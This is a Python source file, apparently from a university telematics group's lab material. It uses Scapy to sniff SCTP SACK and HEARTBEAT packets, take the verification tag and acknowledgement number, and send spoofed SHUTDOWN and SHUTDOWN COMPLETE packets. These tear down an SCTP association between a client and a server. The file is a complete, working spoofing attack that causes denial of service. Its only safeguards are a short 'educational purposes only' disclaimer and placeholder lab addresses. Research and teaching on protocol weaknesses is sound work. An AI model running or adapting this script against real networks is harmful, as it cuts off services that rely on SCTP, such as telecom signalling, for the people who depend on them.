"""
===============================================================================
Script Name: shutdown_attack.py
Description : This script captures a HEARTBEAT SCTP packet to extract relevant information
              and sends an SHUTDOWN SCTP packet to execute an SCTP attack.
Author      : Grupo de Ingeniería Telemática. Universidad de Cantabria
===============================================================================

Notes:
- It uses Scapy library to sniff packets, extract relevant details, crafting a new packet, and send it.
- The script is designed to run in a controlled environment where SCTP traffic is present.
- Ensure you have Scapy installed and run this script with appropriate permissions.
- This script is for educational purposes only. Use responsibly and ethically.
===============================================================================
"""

from scapy.all import *

IP_CLIENT = "10.10.10.7" # Replace with the actual SCTP client IP
IP_SERVER = "10.10.10.155" # Replace with the actual SCTP server IP

# Function to check HEARTBEAT
def is_heartbeat_packet(pkt):
    if SCTP not in pkt:
        print("No SCTP layer")
        return False

    layer = pkt[SCTP].payload
    #print(f"First Chunk: {type(layer).__name__}")

    while isinstance(layer, Packet) and not isinstance(layer, NoPayload):
        print(f"   - Checking chunk type: {type(layer).__name__}")
        chunk_type = getattr(layer, "type", None)
        if chunk_type == 4:  # 4 = HEARTBEAT REQUEST
            #pkt.show()
            return True
        layer = layer.payload

    #print("No HEARTBEAT found")
    return False

"""
Captures a HEARTBEAT SCTP packet and returns the first packet captured.
"""
def capture_heartbeat_packet():
    print(f"\n[*] Monitoring network for SCTP HEARTBEAT packet from {IP_CLIENT} to {IP_SERVER}...")
    packets = sniff(
        filter=f"sctp and src host {IP_CLIENT} and dst host {IP_SERVER}",
        lfilter=is_heartbeat_packet,
        count=1
    )

    if not packets:
        print("No HEARTBEAT packet captured. Exiting.")
        exit(1)

    return packets[0]

"""
Extracts relevant details from a HEARTBEAT SCTP packet.
"""
def extract_heartbeat_details(pkt):
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    src_port = pkt[SCTP].sport
    dst_port = pkt[SCTP].dport
    vtag = pkt[SCTP].tag

    return {
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "src_port": src_port,
        "dst_port": dst_port,
        "vtag": vtag
    }

"""
Prints the details of a HEARTBEAT SCTP packet.
"""
def print_heartbeat_packet_details(details):
    print("\n[*] Captured HEARTBEAT packet details:")
    print(f"   - Source IP: {details['src_ip']}")
    print(f"   - Destination IP: {details['dst_ip']}")
    print(f"   - Source Port: {details['src_port']}")
    print(f"   - Destination Port: {details['dst_port']}")
    print(f"   - Verification Tag: {details['vtag']:#010x}")

"""
Constructs a SHUTDOWN SCTP packet using the extracted details.
"""
def crafting_shutdown_packet(details, tsn_ack):
    return (
        IP(src=IP_CLIENT, dst=IP_SERVER, id=0x0000, flags="DF") /
        SCTP(sport=details["src_port"], dport=details["dst_port"], tag=details["vtag"]) /
        SCTPChunkShutdown(cumul_tsn_ack=tsn_ack)
    )

"""
Prints the details of a SHUTDOWN SCTP packet.
"""
def print_shutdown_packet_details(details):
    print("\n[*] SHUTDOWN packet parameters:")
    #shutdown_pkt.show()
    print(f"   - Source IP: {IP_CLIENT} (spoofed as Node Client)")
    print(f"   - Destination IP: {IP_SERVER} (Node Server)")
    print(f"   - Source Port: {details['src_port']}")
    print(f"   - Destination Port: {details['dst_port']}")
    print(f"   - Verification Tag: {details['vtag']:#010x}")

"""
Sends a SHUTDOWN SCTP packet.
"""
def send_shutdown_packet(pkt):
    print(f"\n[*] Sending SHUTDOWN packet to Node Server ({IP_SERVER})...")
    send(pkt, verbose=False)
    print("   - SHUTDOWN packet sent.")

def is_sack_packet(pkt):
    if SCTP in pkt:
        # print(f"[DEBUG] Paquete SCTP recibido: {pkt.summary()}")
        sctp = pkt[SCTP]
        chunks = list(sctp.iterpayloads())
        # print(f"[DEBUG] Chunks encontrados: {len(chunks)} - Tipos: {[type(c).__name__ for c in chunks]}")
        if len(chunks) == 2 and isinstance(chunks[1], SCTPChunkSACK):
            print("   - SCTP SACK packet found.")
            return True
        else:
            return False
    return False

"""
Extracts the value of the 'cumul_tsn_ack' field from the SACK chunk.
"""
def extract_cumulative_tsn_ack(pkt):
    sctp = pkt[SCTP]
    chunks = list(sctp.iterpayloads())
    #print(f"[DEBUG] Chunks encontrados: {len(chunks)} - Tipos: {[type(c).__name__ for c in chunks]}")
    sack_chunk = chunks[1]

    if not isinstance(sack_chunk, SCTPChunkSACK):
        print("[ERROR] No se encontró un chunk SACK válido.")
        exit(1)
    if not hasattr(sack_chunk, 'cumul_tsn_ack'):
        print("[ERROR] El chunk SACK no tiene el campo 'cumul_tsn_ack'.")
        exit(1)

    print(f"   - Cumulative TSN ACK: {sack_chunk.cumul_tsn_ack}")
    return sack_chunk.cumul_tsn_ack

"""
Captures a SACK SCTP packet and returns the first packet captured.
"""
def capture_sack_packet():
    print(f"[*] Monitoring network for SCTP SACK packet from {IP_CLIENT} to {IP_SERVER}...")
    packets = sniff(
        filter=f"sctp and src host {IP_CLIENT} and dst host {IP_SERVER}",
        lfilter=is_sack_packet,
        count=1
    )

    if not packets:
        print("No SACK packet captured. Exiting.")
        exit(1)

    return packets[0]

"""
Verify if the packet is a SCTP SHUTDOWN ACK.
"""
def is_shutdown_ack_packet(pkt):
    if SCTP in pkt and isinstance(pkt[SCTP].payload, SCTPChunkShutdownAck):
        print("   - SCTP SHUTDOWN ACK packet found.")
        return True
    return False

"""
Captures a SHUTDOWN ACK SCTP packet and returns the first packet captured.
"""
def capture_shutdown_ack_packet():
    print(f"\n[*] Monitoring network for SCTP SHUTDOWN ACK packet from {IP_SERVER} to {IP_CLIENT}...")
    packets = sniff(
        filter=f"sctp and src host {IP_SERVER} and dst host {IP_CLIENT}",
        lfilter=is_shutdown_ack_packet,
        count=1
    )

    if not packets:
        print("No SHUTDOWN ACK packet captured. Exiting.")
        exit(1)

    return packets[0]

"""
Sends a SHUTDOWN COMPLETE SCTP packet.
"""
def send_shutdown_complete_packet(details):
    print(f"\n[*] Sending SHUTDOWN COMPLETE packet to Node Server ({IP_SERVER})...")
    shutdown_complete_pkt = (
        IP(src=IP_CLIENT, dst=IP_SERVER, id=0x0000, flags="DF") /
        SCTP(sport=details["src_port"], dport=details["dst_port"], tag=details["vtag"]) /
        SCTPChunkShutdownComplete()
    )
    send(shutdown_complete_pkt, verbose=False)
    print("   - SHUTDOWN COMPLETE packet sent.")

def main():
    # Captures a SACK SCTP packet
    sack_pkt = capture_sack_packet()

    tsn_ack = extract_cumulative_tsn_ack(sack_pkt)

    # Captures a HEARTBEAT SCTP packet
    heartbeat_pkt = capture_heartbeat_packet()

    # Extracts details from the HEARTBEAT packet
    heartbeat_details = extract_heartbeat_details(heartbeat_pkt)

    # Prints the details of the HEARTBEAT packet
    print_heartbeat_packet_details(heartbeat_details)

    # Constructs the SHUTDOWN packet
    shutdown_pkt = crafting_shutdown_packet(heartbeat_details, tsn_ack)

    # Prints the details of the SHUTDOWN packet
    print_shutdown_packet_details(heartbeat_details)

    # Sends the SHUTDOWN packet
    send_shutdown_packet(shutdown_pkt)

    shutdown_ack_pkt = capture_shutdown_ack_packet()

    send_shutdown_complete_packet(heartbeat_details)

if __name__ == "__main__":
    main()
